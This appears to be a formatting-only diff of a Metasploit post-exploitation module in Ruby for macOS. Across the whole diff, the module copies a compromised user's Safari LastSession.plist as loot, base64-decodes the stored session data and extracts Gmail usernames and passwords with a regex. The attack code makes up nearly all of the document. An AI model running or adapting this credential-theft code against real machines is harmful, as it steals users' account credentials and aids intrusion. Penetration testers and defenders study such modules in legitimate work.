@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,34 +8,31 @@ require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'OSX Gather Safari LastSession.plist',
-      'Description'   => %q{
-        This module downloads the LastSession.plist file from the target machine.
-        LastSession.plist is used by Safari to track active websites in the current session,
-        and sometimes contains sensitive information such as usernames and passwords.
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'OSX Gather Safari LastSession.plist',
+                      'Description'   => %q{
+                        This module downloads the LastSession.plist file from the target machine.
+                        LastSession.plist is used by Safari to track active websites in the current session,
+                        and sometimes contains sensitive information such as usernames and passwords.
 
-        This module will first download the original LastSession.plist, and then attempt
-        to find the credential for Gmail. The Gmail's last session state may contain the
-        user's credential if his/her first login attempt failed (likely due to a typo),
-        and then the page got refreshed or another login attempt was made. This also means
-        the stolen credential might contains typos.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ 'meterpreter','shell' ],
-      'References'    =>
-        [
-          ['URL', 'http://www.securelist.com/en/blog/8168/Loophole_in_Safari']
-        ]
-    ))
+                        This module will first download the original LastSession.plist, and then attempt
+                        to find the credential for Gmail. The Gmail's last session state may contain the
+                        user's credential if his/her first login attempt failed (likely due to a typo),
+                        and then the page got refreshed or another login attempt was made. This also means
+                        the stolen credential might contains typos.
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'sinn3r'],
+                      'Platform'      => [ 'osx' ],
+                      'SessionTypes'  => [ 'meterpreter', 'shell' ],
+                      'References'    =>
+                        [
+                          ['URL', 'http://www.securelist.com/en/blog/8168/Loophole_in_Safari']
+                        ]))
   end
-
 
   #
   # Returns the Safari version based on version.plist
@@ -45,7 +43,11 @@ class MetasploitModule < Msf::Post
     version = ''
 
     f = read_file("/Applications/Safari.app/Contents/version.plist")
-    xml = REXML::Document.new(f) rescue nil
+    xml = begin
+            REXML::Document.new(f)
+          rescue
+            nil
+          end
     return version if xml.nil?
 
     xml.elements['plist/dict'].each_element do |e|
@@ -68,16 +70,14 @@ class MetasploitModule < Msf::Post
     read_file(filename)
   end
 
-
   #
   # Returns the XML version of LastSession.plist (text file)
   # Just a wrapper for plutil
   #
   def get_lastsession
     print_status("#{peer} - Looking for LastSession.plist")
-    plutil("#{expand_path("~")}/Library/Safari/LastSession.plist")
+    plutil("#{expand_path('~')}/Library/Safari/LastSession.plist")
   end
-
 
   #
   # Returns the <array> element that contains session data
@@ -87,17 +87,20 @@ class MetasploitModule < Msf::Post
   def get_sessions(lastsession)
     session_dict = nil
 
-    xml = REXML::Document.new(lastsession) rescue nil
+    xml = begin
+            REXML::Document.new(lastsession)
+          rescue
+            nil
+          end
     return nil if xml.nil?
 
     xml.elements['plist'].each_element do |e|
       found = false
       e.elements.each do |e2|
-        if e2.text == 'SessionWindows'
-          session_dict = e.elements['array']
-          found = true
-          break
-        end
+        next unless e2.text == 'SessionWindows'
+        session_dict = e.elements['array']
+        found = true
+        break
       end
 
       break if found
@@ -105,7 +108,6 @@ class MetasploitModule < Msf::Post
 
     session_dict
   end
-
 
   #
   # Returns the <dict> session element
@@ -119,11 +121,10 @@ class MetasploitModule < Msf::Post
     found = false
     xml.each_element do |e|
       e.elements['array/dict'].each_element do |e2|
-        if e2.text =~ domain_regx
-          dict = e
-          found = true
-          break
-        end
+        next unless e2.text =~ domain_regx
+        dict = e
+        found = true
+        break
       end
 
       break if found
@@ -131,7 +132,6 @@ class MetasploitModule < Msf::Post
 
     dict
   end
-
 
   #
   # Extracts Gmail username/password
@@ -146,9 +146,9 @@ class MetasploitModule < Msf::Post
     raw_data = gmail_dict.elements['array/dict/data'].text
     decoded_data = Rex::Text.decode_base64(raw_data)
     cred = decoded_data.scan(/Email=(.+)&Passwd=(.+)\&signIn/).flatten
-    user, pass = cred.map {|data| Rex::Text.uri_decode(data)}
+    user, pass = cred.map { |data| Rex::Text.uri_decode(data) }
 
-    return '' if user.blank? or pass.blank?
+    return '' if user.blank? || pass.blank?
 
     ['mail.google.com', user, pass]
   end
@@ -157,11 +157,9 @@ class MetasploitModule < Msf::Post
   # Runs the module
   #
   def run
-    cred_tbl = Rex::Text::Table.new({
-      'Header'  => 'Credentials',
-      'Indent'  => 1,
-      'Columns' => ['Domain', 'Username', 'Password']
-    })
+    cred_tbl = Rex::Text::Table.new('Header' => 'Credentials',
+                                    'Indent'  => 1,
+                                    'Columns' => ['Domain', 'Username', 'Password'])
 
     #
     # Downloads LastSession.plist in XML format
@@ -172,23 +170,21 @@ class MetasploitModule < Msf::Post
       return
     else
       p = store_loot('osx.lastsession.plist', 'text/plain', session, lastsession, 'LastSession.plist.xml')
-      print_good("#{peer} - LastSession.plist stored in: #{p.to_s}")
+      print_good("#{peer} - LastSession.plist stored in: #{p}")
     end
 
     #
     # If this is an unpatched version, we try to extract creds
     #
-=begin
-    version = get_safari_version
-    if version.blank?
-      print_warning("Unable to determine Safari version, will try to extract creds anyway")
-    elsif version >= "6.1"
-      print_status("#{peer} - This machine no longer stores session data in plain text")
-      return
-    else
-      vprint_status("#{peer} - Safari version: #{version}")
-    end
-=end
+    #     version = get_safari_version
+    #     if version.blank?
+    #       print_warning("Unable to determine Safari version, will try to extract creds anyway")
+    #     elsif version >= "6.1"
+    #       print_status("#{peer} - This machine no longer stores session data in plain text")
+    #       return
+    #     else
+    #       vprint_status("#{peer} - Safari version: #{version}")
+    #     end
 
     #
     # Attempts to convert the XML file to an actual XML object, with the <array> element
@@ -215,5 +211,4 @@ class MetasploitModule < Msf::Post
       print_line(cred_tbl.to_s)
     end
   end
-
 end
